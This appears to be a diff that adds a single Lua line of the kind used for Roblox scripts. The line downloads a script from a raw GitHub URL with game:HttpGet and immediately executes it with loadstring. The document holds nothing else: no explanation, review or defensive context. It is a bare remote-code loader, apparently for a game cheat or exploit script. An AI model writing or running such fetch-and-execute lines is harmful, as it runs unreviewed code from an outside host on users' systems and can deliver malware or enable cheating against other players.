@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/zznefethbxau0/a-m-f/main/ani-moon-fors-new')))()
